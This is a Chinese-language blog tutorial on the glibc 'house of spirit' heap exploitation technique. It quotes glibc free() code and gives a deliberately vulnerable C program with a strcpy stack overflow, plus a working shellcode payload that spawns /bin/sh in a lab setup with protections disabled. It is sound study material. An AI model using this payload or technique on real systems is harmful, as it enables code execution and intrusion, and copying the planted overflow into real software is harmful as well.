---
title: house of spirit
date: 2016-10-18 08:16:26
tags: 
- heap
- exploit
categories:
- heap_exploit
---

最近几天有点忙，实在是没多少时间写博客，但是还是抽出点时间来记录一下，养成个好习惯！
今天记录的house of spirit跟stack有关，但是核心部分依然是堆的free。但中间遇到个问题，直接执行程序得不到shell，但是我用gdb调试最后却得到了shell......不知道为什么。

## 利用条件

1. p = malloc(n),栈溢出能覆盖p。
2. free(p)时，可以控制这个伪造chunk的size字段，同时可以控制next chunk的size字段。
3. q = malloc(n)，n经过request2size(n)转化后等于上一次伪造的size。
4. 可以控制指针q指向的内存。
<!-- more -->
## 利用详解

house of spirit其实就是通过栈溢出伪造一个chunk，然后free，然后malloc，使得可以对栈上的返回地址进行任意写。
首先覆盖p为栈上的地址(需要进过计算)。要注意的是，应该对相邻的下一个chunk的size字段进行适当操作，其大小要合适，且pre_inuse(for fastbin, pre_inuse always equals 1)位置1，因为在释放伪造的chunk时，会进行相关检查。

```c
void
_int_free(mstate av, Void_t* mem)
{
  mchunkptr       p;           /* chunk corresponding to mem */
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr*    fb;          /* associated fastbin */

  [...]

  p = mem2chunk(mem);
  size = chunksize(p);

  [...]

  /*
    If eligible, place chunk on a fastbin so it can be found
    and used quickly in malloc.
  */

  if ((unsigned long)(size) <= (unsigned long)(av->max_fast)

  #if TRIM_FASTBINS
      /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
      */
      && (chunk_at_offset(p, size) != av->top)
  #endif
      ) {

    //to check if the next chunk's size is OK~~~

    if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
      {
		errstr = "free(): invalid next size (fast)";
		goto errout;
      }

    [...]
    fb = &(av->fastbins[fastbin_index(size)]);
    [...]
    p->fd = *fb;
    *fb = p;
  }
```
如果要说为什么是跟fastbin有关，我觉得这就不一定了。这要看后面第二次malloc时的大小了。至于如果后面malloc的大小大于fastbin的max了，我就不知道能不能利用成功了。
接着free时，glibc会将伪造的chunk link到fastbin中。然后malloc时返回的地址将是栈上的地址，当你可以对malloc返回地址写数据时，可以覆盖return address为shellcode的地址。

## 利用举例

任何利用方式只有举个例子才明白，所以还是来点实际的吧

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void vuln(char *str1, int age)
{
  char *ptr1, name[44];
  int local_age;
  char *ptr2;

  local_age = age;

  ptr1 = (char *) malloc(256);
  printf("\nPTR1 =  %p ", ptr1);
  strcpy(name, str1);
  printf("\nPTR1 =  %p \n", ptr1);

  free(ptr1);

  ptr2 = (char *) malloc(40);
  printf("\nPTR2 =  %p \n", ptr2);

  snprintf(ptr2, 40-1, "%s is %d years old", name, local_age);
  printf("\n%s\n", ptr2);
}

int main(int argc, char *argv[])
{
  int pad[10];
  int i;
  for(i = 0; i < 10; i ++)
  { 
    pad[i] = 0x21;   //to satisfy the next chunk's size
  }

  if (argc == 3)
  {
    vuln(argv[1], atoi(argv[2]));
  }

  return 0;
}
```

默认是关闭DEP，ALSR，和stack protector的。
首先用gdb调试确定各个变量的位置:
<img src="http://of38fq57s.bkt.clouddn.com/spirit_set_args.PNG" >
<img src="http://of38fq57s.bkt.clouddn.com/spirit_find_place.PNG" >
由图我们可以得到各变量的位置如下：
```c
|----------|
|..........|
|..name[]..| <----0xbffff378
|..........|
|..name[]..|
|..ptr2....| <----0xbffff3a4
|..ptr1....| <----0xbffff3a8
|..localage| <----0xbffff3ac
|..........| <----0xbffff3b0
|..........|
|..........|
|.main ebp.| 
|.ret addr.|
|.argv[2]..|
|.argv[1]..|
|..........|
|...pad[]..| <----0xbffff3de
```

localage变量是伪造chunk的size字段，大小等于0x30。覆盖p为0xbffff3b0，当free时，glibc会把0xbffff3a8 link到fastbin中，这会检查后一个相邻chunk的size字段，我们已经填充了，即pad[]。然后后面malloc(40)时，会把0xbffff3b0返回给用户。然后我们可以对相应栈区进行写操作，覆盖ret addr为shellcode地址。
此时malloc返回地址离ret addr还有12个字节。所以这部分要填充。然后是返回地址0xbfffff378(of course you can jump the right shellcode address), 前面"\xeb\x0e"是jmp到shellcode的位置，即从"\x6a"开始部分。
所以argv[1]的内容为：
```python
"\xeb\x0e\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x78\xf3\xff\xbf\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"a"*8+"\xb0\xf3\xff\xbf\x30"
```
至于argv[2]取什么值没影响。
我们能看到第二次p被覆盖为0xbffff3b0，且第二次malloc时返回的地址为0xbffff3b0。最后我们得到了一个shell！！！

<img src="http://of38fq57s.bkt.clouddn.com/spirit_shell.PNG">

不知道为什么直接运行程序得不到shell：
<img src="http://of38fq57s.bkt.clouddn.com/spirit_error.PNG">
这真的很奇怪......一步一步调试发现free()可以正常执行啊。Anyway, got a shell at last!

## 相关参考

相关链接：
[Heap overflow using Malloc Maleficarum](https://sploitfun.wordpress.com/tag/house-of-force/)
[X86 EXPLOITATION 101: “HOUSE OF SPIRIT” – FRIENDLY STACK OVERFLOW](https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/)

